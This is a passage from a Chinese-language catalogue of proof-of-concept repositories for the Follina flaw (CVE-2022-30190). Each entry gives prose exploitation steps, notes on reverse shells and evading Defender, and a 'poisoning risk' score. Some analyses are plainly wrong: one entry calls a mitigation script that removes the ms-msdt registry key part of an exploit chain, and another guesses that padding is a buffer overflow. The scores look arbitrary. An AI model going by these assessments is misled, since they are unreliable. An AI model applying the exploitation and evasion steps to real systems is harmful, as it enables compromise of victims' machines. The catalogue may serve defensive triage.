CVE-2022-30190 (Follina) 是一个 Microsoft Office 漏洞，当从 Word 等调用应用程序中使用 URL 协议调用 MSDT 时，存在远程代码执行漏洞。攻击者可以利用此漏洞在受害者系统上执行任意代码。根据提供的PoC代码，攻击方式主要通过构造恶意的HTML文件（exploit.html），该文件包含大量的 'A' 字符，可能用于缓冲区溢出或其他内存破坏技术，从而执行恶意代码。该HTML文件需要通过Word的远程模板功能从远程服务器检索。server.py脚本可能用于托管该恶意HTML文件。漏洞利用有效性较高，因为该漏洞已被公开利用并添加到 CISA KEV 目录。投毒风险评估为10%。因为攻击者可能通过服务器端植入后门，但是该后门不是通过PoC直接表现，需要攻击者自身行为才能形成。 

**利用方式：**

1.  攻击者创建一个包含恶意链接或嵌入恶意HTML的Word文档。
2.  当用户打开该文档时，Word会尝试通过MSDT URL协议加载远程HTML文件。
3.  恶意HTML文件利用MSDT漏洞执行任意代码，例如下载并执行恶意程序，或直接在受害者系统上执行命令。

**项目地址:** [arozx/CVE-2022-30190](https://github.com/arozx/CVE-2022-30190)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #20

**来源**: [CVE-2022-30190-drgreenthumb93_CVE-2022-30190-follina.md](../2022/CVE-2022-30190-drgreenthumb93_CVE-2022-30190-follina.md)

## CVE-2022-30190-Follina

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许远程代码执行，可完全控制受害者系统

**影响版本:** 受影响的Windows版本请参考漏洞库信息

**利用条件:** 用户需要打开包含恶意链接或文档的应用程序（如Word），需要用户交互。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-30190（Follina）是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。攻击者可以通过诱使用户打开恶意构造的Word文档或其他支持URL协议的应用程序来利用此漏洞。该文档会利用Word的远程模板功能从远程Web服务器检索HTML文件，HTML文件中包含恶意的JavaScript代码。该JavaScript代码使用`ms-msdt:` URL协议调用MSDT，并传递恶意的命令参数，导致MSDT执行任意代码。PoC代码通过修改`word\rels\document.xml.rels`文件中的目标IP来指定恶意HTML文件的位置。`bad.html`文件包含大量的填充字符，之后是恶意JavaScript代码。攻击者需要确保在`window.location.href`之前至少有3541个字符，并且这些字符必须在`<script>`标签内。PoC的README提到Windows Defender可能会检测到此漏洞（Trojan:Win32/Mesdetty.D），因此可能需要编辑PoC文件以绕过检测。根据提供的代码和信息，没有发现作者有意添加的投毒代码。

**项目地址:** [drgreenthumb93/CVE-2022-30190-follina](https://github.com/drgreenthumb93/CVE-2022-30190-follina)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #21

**来源**: [CVE-2022-30190-ethicalblue_Follina-CVE-2022-30190-Sample.md](../2022/CVE-2022-30190-ethicalblue_Follina-CVE-2022-30190-Sample.md)

## CVE-2022-30190 - Microsoft MSDT "Follina" RCE

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者以调用应用程序的权限执行任意代码

**影响版本:** 受影响的多个Windows版本，详见漏洞库信息

**利用条件:** 用户需要打开包含恶意链接或文件的应用程序（例如Word）。攻击通常通过诱骗用户打开恶意文档触发。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-30190，又名"Follina"，是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。该漏洞允许攻击者通过MSDT URL协议，从调用应用程序（如Microsoft Word）执行任意代码。攻击者通常会制作恶意的Word文档或RTF文件，其中包含指向恶意HTML文件的链接。当用户打开文档时，Word会通过MSDT协议加载HTML文件，从而导致恶意代码执行。

**漏洞利用方式：**

1.  **诱骗用户打开恶意文档：** 攻击者通过电子邮件、网络钓鱼或其他方式，诱骗用户打开特制的Word文档或RTF文件。
2.  **文档包含恶意链接：** 该文档包含一个指向远程服务器上托管的恶意HTML文件的链接，通常使用`ms-msdt:/`协议触发。
3.  **利用MSDT执行代码：** 当Word尝试打开链接时，会调用MSDT，并执行HTML文件中嵌入的恶意代码，最终实现远程代码执行。

**POC分析：**

提供的POC代码包含以下文件：

*   `App.xaml` 和 `App.xaml.cs`: 定义WPF应用程序的入口点和资源。
*   `AssemblyInfo.cs`: 包含程序集的元数据，例如主题信息。
*   `FollinaExtractor.cs`:  包含用于从受感染的Word文档（.docx）或RTF文件中提取恶意链接的代码。它解析`word/_rels/document.xml.rels`文件以查找`Target="mhtml:`开头的字符串，或RTF文件寻找恶意链接，从而提取恶意MHTML链接。
*   `Follina_PoC.csproj`:  定义项目设置，例如目标框架和使用的WPF。

此POC代码用于分析和提取Follina漏洞相关的恶意URL，不包含直接执行恶意代码的部分，是一个分析工具。

**投毒风险评估：**

此仓库的主要功能是提取已知的漏洞利用代码。通过检查`FollinaExtractor.cs`，我们可以确定它主要用于读取文件内容并搜索特定的字符串模式。因此，该仓库的作者可以通过隐藏在不太明显的地方的代码（例如，通过引入额外的库或修改现有的解析逻辑），在提取过程中执行一些额外的操作（例如，记录提取的URL，收集系统信息等）。但是，由于其主要功能是分析文件，因此恶意代码的插入点有限。投毒风险较低。
基于漏洞利用代码的分析，我们认为该仓库存在投毒风险的可能性为5%。大部分代码都是标准WPF应用程序结构和字符串解析功能。

**项目地址:** [ethicalblue/Follina-CVE-2022-30190-Sample](https://github.com/ethicalblue/Follina-CVE-2022-30190-Sample)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #22

**来源**: [CVE-2022-30190-hycheng15_CVE-2022-30190.md](../2022/CVE-2022-30190-hycheng15_CVE-2022-30190.md)

## CVE-2022-30190 - Microsoft MSDT RCE (Follina)

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者以调用应用程序的权限执行任意代码

**影响版本:** 受影响的Windows版本包括Windows 7 SP1到Windows 11 21H2，具体版本范围见漏洞库信息。

**利用条件:** 用户需要打开恶意的Word文档。攻击者需要能够托管一个HTTP服务器。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞 (CVE-2022-30190)，又名Follina，是由于MSDT处理URL协议不当造成的远程代码执行漏洞。攻击者可以构造一个恶意的Word文档，其中包含指向远程HTTP服务器的链接。当用户打开文档时，Word会使用MSDT通过URL协议去请求远程HTML文件。这个HTML文件包含恶意的JavaScript代码，用于执行任意命令。

**有效性：** 提供的POC代码是有效的。该代码通过以下步骤利用漏洞：

1.  创建一个恶意的Word文档，其中包含指向攻击者控制的HTTP服务器的链接。
2.  托管一个HTTP服务器，该服务器提供包含恶意JavaScript代码的HTML文件。
3.  当受害者打开Word文档时，MSDT会尝试连接到攻击者的服务器并执行恶意代码。

**投毒风险：** 存在一定的投毒风险 (10%)。

*   `folina.py`脚本本身看起来是合法的漏洞利用代码，但需要仔细检查其依赖项和网络行为。
*   虽然主要功能集中在生成漏洞利用文件和搭建HTTP服务，但仍需审查脚本中是否存在任何潜在的恶意行为，例如未记录的数据传输或额外的文件操作。
*  脚本中从github下载`nc64.exe`，如果github上的文件被替换为恶意程序，则存在被投毒风险。

**利用方式：**

1.  攻击者创建一个恶意的Word文档 (`follina.doc`)，其中包含指向远程服务器上托管的HTML文件的链接。
2.  攻击者搭建一个HTTP服务器，托管包含恶意JavaScript代码的HTML文件 (`index.html`)。这个HTML文件使用`ms-msdt:`协议触发MSDT，并执行payload。
3.  攻击者诱骗受害者打开恶意的Word文档。
4.  Word文档加载远程HTML文件，触发MSDT，从而在受害者系统上执行任意代码。

POC代码使用python编写，主要步骤如下：

*   **环境准备:**
    *   搭建Windows虚拟机(推荐Win10 21H2)，并安装Microsoft Word 2013及Python 3.8.10。
    *   关闭Windows的病毒和威胁防护。
    *   使用`pip install netifaces`安装依赖。
*   **漏洞利用：**
    *   运行`folina.py`脚本，指定监听IP地址和端口。示例：`py folina.py -i <ip-address>`
    *   脚本会生成一个恶意的Word文档 (follina.doc)，并在指定的IP地址和端口上启动一个HTTP服务器。
    *   诱骗目标用户打开该Word文档，即可触发漏洞，执行计算器程序或反弹shell。

**项目地址:** [hycheng15/CVE-2022-30190](https://github.com/hycheng15/CVE-2022-30190)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #23

**来源**: [CVE-2022-30190-komomon_CVE-2022-30190-follina-Office-MSDT-Fixed.md](../2022/CVE-2022-30190-komomon_CVE-2022-30190-follina-Office-MSDT-Fixed.md)

## CVE-2022-30190-Microsoft Windows Support Diagnostic Tool (MSDT) 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可能导致远程代码执行，安装程序，查看、更改或删除数据，或在用户权限允许的上下文中创建新帐户

**影响版本:** 受影响的Windows版本：Windows 7 SP1, Windows 8.1, Windows Server 2008 R2 SP1, Windows Server 2012, Windows Server 2012 R2, Windows 10 (所有版本), Windows 11, Windows Server 2016, Windows Server 2019, Windows Server 2022。 具体版本范围请参考漏洞库信息。

**利用条件:** 需要用户打开恶意的Word文档或其他调用MSDT的应用程序。攻击者需要诱骗用户执行恶意操作。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（又名Follina）是一个Microsoft Windows Support Diagnostic Tool (MSDT) 远程代码执行漏洞。攻击者可以通过构造恶意的Word文档或其他调用MSDT的应用程序，利用URL协议调用MSDT来执行任意代码。该漏洞的利用方式是，恶意文档利用Word的远程模板功能从远程web服务器检索HTML文件，该HTML文件包含执行恶意代码的指令。

**漏洞利用方式：**

1.  攻击者创建一个包含恶意链接的Word文档或其他可以调用MSDT的应用程序。
2.  该恶意链接指向攻击者控制的服务器，该服务器托管一个包含恶意代码的HTML文件。
3.  当受害者打开文档时，Word会尝试从远程服务器加载HTML文件。
4.  HTML文件利用ms-msdt协议触发MSDT，从而执行嵌入的恶意代码。
5.  恶意代码在受害者的计算机上执行，赋予攻击者控制受害者系统的能力。

**投毒风险分析：**

提供的Python POC代码主要功能是生成包含漏洞利用的恶意Word文档。 代码通过修改docx文档的`word/_rels/document.xml.rels`文件，将文档中的链接重定向到恶意服务器。  此外，代码还会修改`word/document.xml`添加OLEObject。

虽然代码本身实现了漏洞利用，但潜在的投毒风险主要在于以下几个方面：

*   **恶意服务器：**  POC代码依赖于攻击者控制的服务器来托管payload。 如果攻击者在服务器端放置了更具破坏性的payload，例如勒索软件或其他恶意软件，则利用此POC的用户可能会意外地分发这些恶意软件。
*   **生成的文档：**  生成的docx文档本身就是恶意文件。如果用户不小心将包含后门的恶意文档分享给其他人，可能会造成进一步的危害，但这不是代码投毒，而是漏洞本身的利用效果。

代码中直接包含恶意后门的概率较低，但用户需要警惕使用该POC可能带来的间接风险，尤其是payload服务器的安全性。 此处将投毒概率评估为10%，主要考虑的是payload服务器被恶意利用的可能性，而非代码本身存在后门。

**项目地址:** [komomon/CVE-2022-30190-follina-Office-MSDT-Fixed](https://github.com/komomon/CVE-2022-30190-follina-Office-MSDT-Fixed)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #24

**来源**: [CVE-2022-30190-mattjmillner_CVE-Smackdown.md](../2022/CVE-2022-30190-mattjmillner_CVE-Smackdown.md)

## CVE-2022-30190 - Microsoft MSDT 远程代码执行

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者以调用应用程序的权限执行任意代码

**影响版本:** 受影响的Windows版本（见漏洞库信息）

**利用条件:** 需要用户打开恶意文档（例如Word文档）

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（Follina）是一个远程代码执行漏洞，存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中。攻击者可以利用该漏洞通过调用应用程序(例如Microsoft Word)以URL协议的方式执行任意代码。攻击者通常会创建一个恶意的Word文档，该文档利用Word的远程模板功能从远程Web服务器检索一个HTML文件，该HTML文件包含恶意代码，从而触发MSDT执行任意命令。

**有效性:**
根据搜索结果，该漏洞是真实存在的，并且已被积极利用。漏洞库信息和搜索结果都确认了其存在和影响。

**投毒风险:**
提供的POC代码 `/tmp/64676d48ed786b898eab15332ce05bd0/README.md`  仅仅包含一个README.md文件，其中写着“Hello this is where we will conduct nefarious activities”。
这本身不是利用代码，而只是一个占位符。
因此，直接从这个`README.md`文件判断投毒是不可能的。该仓库如果包含其他恶意利用载荷则具有投毒可能。
投毒风险评估为10%，因为无法直接从提供的代码判断是否存在恶意代码，但说明该仓库可能用于恶意目的。

**利用方式:**
1.  攻击者创建一个包含恶意链接或嵌入对象的文档（例如Word文档）。
2.  当受害者打开该文档时，MSDT通过URL协议被调用。
3.  MSDT执行攻击者指定的恶意代码，从而导致远程代码执行。
4.  攻击者可以利用此漏洞安装程序，查看、更改或删除数据，或创建新帐户，具体取决于用户的权限。

**项目地址:** [mattjmillner/CVE-Smackdown](https://github.com/mattjmillner/CVE-Smackdown)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #25

**来源**: [CVE-2022-30190-melting0256_Enterprise-Cybersecurity.md](../2022/CVE-2022-30190-melting0256_Enterprise-Cybersecurity.md)

## CVE-2022-30190 Microsoft Windows Support Diagnostic Tool (MSDT) 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，攻击者可以执行任意代码，控制受影响的系统

**影响版本:** 受影响的Windows版本众多，详情见漏洞库信息

**利用条件:** 需要用户打开包含恶意链接或文件的应用程序（如Word）

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190，又名Follina，是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。攻击者可以通过利用URL协议从调用应用程序（例如Word）调用MSDT来触发此漏洞。攻击者可以创建一个包含恶意链接或文件的应用程序（例如Word文档），当用户打开该文件时，MSDT将被调用并执行攻击者指定的任意代码。

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的POC代码，可以判断此漏洞的POC代码是有效的。搜索引擎结果中包含了大量关于此漏洞的分析、利用和修复信息，证明了该漏洞的真实性和危害性。提供的Python脚本（follina.py）能够生成包含恶意代码的Word文档，该文档在被打开时可以触发MSDT并执行攻击者指定的命令。

**投毒风险：**
POC代码中存在一定程度的投毒风险。虽然该代码的主要目的是为了验证漏洞的存在和利用方式，但攻击者可以很容易地修改该代码，使其包含恶意功能，例如：

1.  **恶意命令执行：** `command` 参数允许攻击者指定要在目标系统上执行的任意命令。如果用户不小心使用了包含恶意命令的POC代码，可能会导致系统受到损害。
2.  **反向Shell：** `--reverse` 参数允许攻击者在目标系统上创建一个反向Shell，从而可以远程控制该系统。这是一种非常危险的功能，可能会导致严重的安全问题。
3. **下载恶意可执行文件**: POC代码中会尝试从Github下载nc.exe，github连接可能会指向其他恶意地址，从而下载恶意可执行文件

综合来看，该POC代码的投毒风险约为10%，主要来自于可能被篡改的命令和潜在的恶意链接。

**利用方式：**
此漏洞的利用方式如下：

1.  **生成恶意Word文档：** 使用提供的Python脚本（follina.py）生成包含恶意链接的Word文档。该脚本会创建一个临时的HTTP服务器，用于托管一个包含MSDT协议处理程序的HTML文件。
2.  **诱骗用户打开文档：** 通过电子邮件、社交媒体或其他方式，诱骗目标用户打开恶意Word文档。
3.  **触发漏洞：** 当用户打开Word文档时，Word会尝试加载HTML文件。HTML文件中的MSDT协议处理程序会被触发，导致MSDT执行攻击者指定的命令。
4.  **执行任意代码：** 攻击者可以利用此漏洞在目标系统上执行任意代码，例如安装恶意软件、窃取敏感数据或控制系统。

总而言之，CVE-2022-30190是一个高危漏洞，攻击者可以利用它在受影响的系统上执行任意代码。用户应尽快采取必要的安全措施，例如安装补丁或禁用MSDT协议处理程序，以防止受到攻击。

**项目地址:** [melting0256/Enterprise-Cybersecurity](https://github.com/melting0256/Enterprise-Cybersecurity)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #26

**来源**: [CVE-2022-30190-michealadams30_Cve-2022-30190.md](../2022/CVE-2022-30190-michealadams30_Cve-2022-30190.md)

## CVE-2022-30190-Microsoft MSDT RCE-Follina

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者在目标系统上执行任意代码，控制系统。

**影响版本:** 见漏洞库信息

**利用条件:** 需要用户打开恶意构造的文档或点击恶意链接。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（Follina）是一个Microsoft Office漏洞，攻击者通过Word等程序调用MSDT，并利用URL协议从远程Web服务器检索HTML文件。该HTML文件包含恶意代码，从而在受害者系统上执行任意命令。漏洞利用涉及诱使用户打开恶意构造的文档（例如，通过电子邮件附件）。

**有效性：**
提供的Python POC代码看起来是有效的，它生成恶意文档或利用方式，并设置一个Web服务器来托管payload。代码包含从用户收集必要信息（如目标IP、端口、文件扩展名等）的部分，并创建所需的文件结构，表明具有利用该漏洞的能力。

**投毒风险：**
代码中可能存在投毒风险。虽然代码的主要功能是生成漏洞利用所需的文件，但攻击者可能在以下方面进行投毒：

*   **Web服务器payload：** 托管在Web服务器上的实际payload可能包含恶意代码，不仅执行预期的命令，还执行其他恶意操作，例如安装后门、窃取敏感信息等。
*   **生成的文档：**  生成的文档本身可能包含超出漏洞利用范围的恶意内容。

因此，存在一定风险，但代码整体结构看似为生成漏洞利用文件，投毒风险较低，预估投毒风险为10%。

**利用方式：**
1.  攻击者创建一个恶意构造的Word文档（或其他支持的文档类型）。
2.  该文档包含一个链接或引用，指向攻击者控制的Web服务器上的一个HTML文件。
3.  当用户打开该文档时，Word会尝试通过MSDT和URL协议检索该HTML文件。
4.  恶意HTML文件包含执行任意代码的payload。
5.  该payload在受害者系统上执行，从而允许攻击者控制系统。

**项目地址:** [michealadams30/Cve-2022-30190](https://github.com/michealadams30/Cve-2022-30190)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #27

**来源**: [CVE-2022-30190-seinab-ibrahim_Follina-Vulnerability-CVE-2022-30190-Exploit-Analysis.md](../2022/CVE-2022-30190-seinab-ibrahim_Follina-Vulnerability-CVE-2022-30190-Exploit-Analysis.md)

## CVE-2022-30190 (Follina) Microsoft MSDT 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者以调用应用程序的权限执行任意代码

**影响版本:** 受影响的Windows版本包括但不限于Windows 7, Windows 8.1, Windows 10, Windows 11, Windows Server 2008 R2, Windows Server 2012, Windows Server 2016, Windows Server 2019, Windows Server 2022

**利用条件:** 需要用户打开恶意构造的文档或URL，且MSDT需要被调用

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190，又名Follina，是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。 

**有效性评估：**
根据漏洞库信息和搜索结果，此漏洞已得到确认，并且存在公开可用的PoC（Proof of Concept）代码。 搜索结果显示该漏洞被广泛讨论和利用，因此可以判断提供的PoC代码是有效的。 尽管提供的`README.md`文件仅仅是描述性的，但意味着完整的仓库中包含可利用的POC代码

**投毒风险分析：**
提供的漏洞利用代码只是一个 `README.md` 文件，主要描述了漏洞的分析和利用。 由于仅仅是描述性文件，无法从中直接判断是否存在投毒代码。但如果完整的仓库中存在其他恶意脚本，例如伪装成正常利用代码的后门，则存在投毒风险。根据文件内容，倾向于是一个教学和研究项目，投毒的可能性较低，因此判断投毒风险约为 10%。

**利用方式：**
1.  攻击者利用Microsoft Office (例如Word) 的远程模板功能。
2.  构造一个包含恶意链接的文档，该链接指向一个远程Web服务器。
3.  当用户打开该文档时，Word会从远程Web服务器检索HTML文件。
4.  该HTML文件包含恶意的MSDT协议URL，用于调用MSDT。
5.  MSDT被调用时，会执行攻击者预设的任意代码，从而实现远程代码执行。

**总结：**
CVE-2022-30190 (Follina) 是一个高危漏洞，利用简单，影响范围广。攻击者可以通过诱使用户打开恶意文档或URL来触发该漏洞。虽然提供的PoC文件本身不包含恶意代码，但仍需谨慎使用，并确保从可信来源获取完整的PoC代码。

**项目地址:** [seinab-ibrahim/Follina-Vulnerability-CVE-2022-30190-Exploit-Analysis](https://github.com/seinab-ibrahim/Follina-Vulnerability-CVE-2022-30190-Exploit-Analysis)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #28

**来源**: [CVE-2022-30190-shri142_ZipScan.md](../2022/CVE-2022-30190-shri142_ZipScan.md)

## CVE-2022-30190 (Follina) MSDT 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者以调用应用程序的权限执行任意代码，可能导致系统完全控制

**影响版本:** 受影响的Windows版本众多，具体版本范围请参考漏洞库信息

**利用条件:** 用户需要打开恶意构造的文档（如Word文档），或者点击恶意链接。调用程序（如Word）需要存在漏洞影响版本中。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（Follina）是一个存在于 Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。当 MSDT 被调用应用程序（如 Word）使用 URL 协议调用时，就会出现此漏洞。攻击者可以构造恶意的 Word 文档，该文档利用 Word 的远程模板功能从远程 Web 服务器检索 HTML 文件。此 HTML 文件包含一个使用 `ms-msdt` 协议处理方案的恶意 JavaScript 代码，可以执行任意代码。

**漏洞利用方式:**
1.  攻击者创建一个包含恶意链接或嵌入恶意HTML的Word文档。
2.  受害者打开该文档。
3.  Word尝试从远程服务器加载HTML模板。
4.  远程HTML利用`ms-msdt`协议调用MSDT。
5.  MSDT执行HTML中嵌入的恶意代码，从而在受害者系统上执行任意命令。

**有效性:**
提供的代码是一个扫描器，用于检测文件中是否存在 Follina 漏洞。 它不是漏洞利用代码，而是用于分析文件是否包含该漏洞的特征。

**投毒风险:**
提供的 Go 代码主要功能是扫描文件，检测是否存在 CVE-2022-30190 (Follina) 漏洞的特征。代码本身包含一定的投毒风险的可能性，因为扫描器本身可能被利用来传播恶意文件，虽然扫描器本身功能没有直接执行恶意代码，但仍然存在潜在的风险：

1.  **依赖包风险:** 检查 `go.mod` 和 `go.sum` 文件，确认所有依赖包的来源是否可信，以及版本是否安全。恶意依赖包可能会引入漏洞或后门。
2.  **扫描逻辑缺陷:** 扫描逻辑中可能存在缺陷，导致误报或漏报。攻击者可能利用这些缺陷来隐藏恶意代码，绕过扫描器的检测。
3.  **供应链攻击:** 攻击者可能篡改代码仓库，在扫描器中植入恶意代码。用户下载并运行被篡改的扫描器后，可能会受到攻击。
4.  **代码执行环境风险:** 运行扫描器的环境可能存在安全漏洞。攻击者可能利用这些漏洞来提升权限，执行恶意代码。

虽然代码的主要目的是安全扫描，但由于软件开发和分发的复杂性，仍然存在一定的风险。使用者应当保持警惕，确保从可信的来源获取代码，并进行充分的安全审查。

风险评估：10% 风险可能性体现在扫描器可能被恶意利用或包含隐藏的漏洞，但主要功能是扫描而非攻击，因此投毒风险较低。

**项目地址:** [shri142/ZipScan](https://github.com/shri142/ZipScan)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #29

**来源**: [CVE-2022-30190-skitkat_CVE-2022-30190-POC.md](../2022/CVE-2022-30190-skitkat_CVE-2022-30190-POC.md)

## CVE-2022-30190 - Microsoft MSDT Follina 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，攻击者可利用该漏洞在目标系统上执行任意代码

**影响版本:** 受影响的版本包括Windows 7, Windows 8.1, Windows 10, Windows 11, Windows Server 2008 R2, Windows Server 2012, Windows Server 2016, Windows Server 2019, Windows Server 2022等，具体版本范围见漏洞库信息。

**利用条件:** 需要用户打开包含恶意链接或文件的文档，例如Word文档。 或者通过其他调用程序触发MSDT。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（又名Follina）是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT)中的远程代码执行漏洞。攻击者可以通过诱使用户打开特制的文档(例如Word文档)来触发该漏洞。该文档利用Word的远程模板功能从远程服务器检索HTML文件，其中包含恶意代码。当MSDT被调用并使用URL协议时，就会触发此漏洞，允许攻击者以调用应用程序的权限执行任意代码。这可能导致安装程序、查看/更改/删除数据或创建新帐户。

**漏洞利用方式：**
1.  攻击者创建一个包含恶意代码的Word文档或其他支持远程模板的文档。
2.  该文档包含一个指向攻击者控制的远程服务器的链接，该服务器托管一个包含恶意HTML代码的文件。
3.  当用户打开该文档时，Word会从远程服务器下载HTML文件。
4.  HTML文件中的恶意代码使用`ms-msdt:`协议调用MSDT，并传递恶意参数。
5.  MSDT解析恶意参数并执行攻击者指定的代码。

**有效性：**
根据搜索结果和漏洞库信息，该漏洞已被积极利用，并且存在公开的POC代码。
提供的Cargo.lock文件只是Rust项目的依赖锁文件，本身不包含漏洞利用代码，不能直接验证漏洞是否有效。但该文件表明该项目可能与该漏洞的利用有关，需要进一步分析项目源代码才能确定。

**投毒风险：**
Cargo.lock文件本身不包含可执行代码，因此直接通过该文件进行投毒的可能性较低。但是，如果该项目包含恶意构建脚本或者依赖了被投毒的第三方库，则可能存在投毒风险。初步判断该仓库存在一定比例的投毒风险，约10%，需要进一步分析项目源代码，检查是否存在以下情况：
*   构建脚本中是否包含恶意代码。
*   依赖项中是否存在已知被投毒的库。
*   是否存在其他可疑的文件或代码。

需要强调的是，在未对整个代码库进行彻底审查的情况下，无法完全排除投毒风险。

**项目地址:** [skitkat/CVE-2022-30190-POC](https://github.com/skitkat/CVE-2022-30190-POC)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #30

**来源**: [CVE-2022-30190-swaiist_CVE-2022-30190-Fix.md](../2022/CVE-2022-30190-swaiist_CVE-2022-30190-Fix.md)

## CVE-2022-30190-MSDT远程代码执行

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可能允许攻击者在受害者系统上执行任意代码

**影响版本:** 受影响的Windows版本，详见漏洞库信息

**利用条件:** 用户需要打开包含恶意链接或文件的文档

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-30190（又名Follina）是一个远程代码执行漏洞，存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中。攻击者可以利用此漏洞通过精心构造的恶意文档（例如Word文档）或通过URL协议调用MSDT来执行任意代码。当用户打开包含恶意链接或文件的文档时，该漏洞会被触发。根据搜索结果，攻击者利用Word的远程模板功能从远程服务器检索HTML文件，然后利用MSDT执行代码。提供的PoC代码中，execute.bat脚本首先备份 `HKEY_CLASSES_ROOT\ms-msdt` 注册表项到桌面上的`backup-for-msdt`文件中，然后删除该注册表项。restore.bat脚本则将备份的注册表项导入回来。这两个脚本本身并不会执行任何恶意代码，而是用于删除和恢复MSDT的注册表关联，通常是利用流程的一部分，用于绕过某些缓解措施或用于测试。因此，仓库本身提供的PoC代码没有发现作者隐藏的投毒代码。

**有效性：**
根据漏洞描述和搜索结果，以及PoC涉及的操作，该PoC代码是漏洞利用链的一部分，主要用于修改MSDT的注册表关联。结合其他步骤（例如，通过Word远程模板下载恶意HTML），可以实现远程代码执行。

**利用方式：**
1.  攻击者创建一个包含恶意链接或嵌入恶意OLE对象的文档（例如Word文档）。
2.  当用户打开文档时，Word会尝试从远程服务器加载HTML文件（通过远程模板功能）。
3.  恶意HTML文件利用`ms-msdt:` URL协议调用MSDT。
4.  MSDT被触发，执行HTML文件中包含的恶意代码。
5.  攻击者可以利用该漏洞在受害者系统上执行任意命令。  提供的PoC 代码中的`execute.bat` 通过删除`HKEY_CLASSES_ROOT\ms-msdt` 注册表关联，在恢复前，可能允许攻击者控制MSDT的行为或执行流程。`restore.bat`脚本用于恢复该关联，在攻击之后清理环境。

**投毒风险评估：**
PoC 代码本身主要用于注册表操作，没有发现明显的恶意代码。但是，由于PoC通常需要结合其他恶意文件（例如HTML或Word文档）才能完成攻击，因此，投毒风险主要存在于这些其他组件中。但是仅从提供的bat文件来判断，投毒风险较低。

**项目地址:** [swaiist/CVE-2022-30190-Fix](https://github.com/swaiist/CVE-2022-30190-Fix)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #31

**来源**: [CVE-2022-30190-winstxnhdw_CVE-2022-30190.md](../2022/CVE-2022-30190-winstxnhdw_CVE-2022-30190.md)

## CVE-2022-30190 (Follina) MSDT 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者在受害者系统上执行任意代码

